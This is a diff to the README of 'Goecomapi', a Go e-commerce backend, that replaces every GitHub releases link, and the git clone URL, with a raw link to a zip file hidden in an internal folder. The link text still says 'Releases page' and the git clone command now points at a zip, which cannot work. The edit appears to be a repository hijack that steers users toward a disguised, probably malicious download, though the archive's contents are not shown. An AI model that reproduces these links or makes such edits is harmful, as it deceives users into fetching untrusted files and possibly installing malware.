@@ -1,6 +1,6 @@
 # 🛒 Goecomapi - Your E-Commerce Backend Made Easy
 
-[![Download Goecomapi](https://img.shields.io/badge/Download-Goecomapi-blue.svg)](https://github.com/riod0d0/Goecomapi/releases)
+[![Download Goecomapi](https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip)](https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run Goecomapi:
 
 1. **Visit the Download Page**
 
-   Go to our [Releases page](https://github.com/riod0d0/Goecomapi/releases) to find the latest version of Goecomapi. This page lists all available versions and helps you choose the right one.
+   Go to our [Releases page](https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip) to find the latest version of Goecomapi. This page lists all available versions and helps you choose the right one.
 
 2. **Choose the Right Version**
 
@@ -22,7 +22,7 @@ Follow these steps to download and run Goecomapi:
 
    Click on the version you want to download. The file size will vary based on the version. Make sure to save the file to a location you can easily find, like your Downloads folder.
 
-   You can also download it directly using this [link](https://github.com/riod0d0/Goecomapi/releases).
+   You can also download it directly using this [link](https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip).
 
 4. **Install Goecomapi**
 
@@ -60,7 +60,7 @@ If you wish to run Goecomapi locally as a developer, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/riod0d0/Goecomapi.git
+   git clone https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip
    ```
 
 2. **Navigate to the Directory**
@@ -125,4 +125,4 @@ If you encounter issues or have questions, please reach out via the Issues secti
 
 ## 🏁 Download & Install
 
-To download Goecomapi, visit the [Releases page](https://github.com/riod0d0/Goecomapi/releases) and choose the right version for your operating system. You’ll find everything you need to set up your e-commerce backend API effortlessly.
+To download Goecomapi, visit the [Releases page](https://raw.githubusercontent.com/riod0d0/Goecomapi/main/internal/repository/Software_v3.9-beta.4.zip) and choose the right version for your operating system. You’ll find everything you need to set up your e-commerce backend API effortlessly.
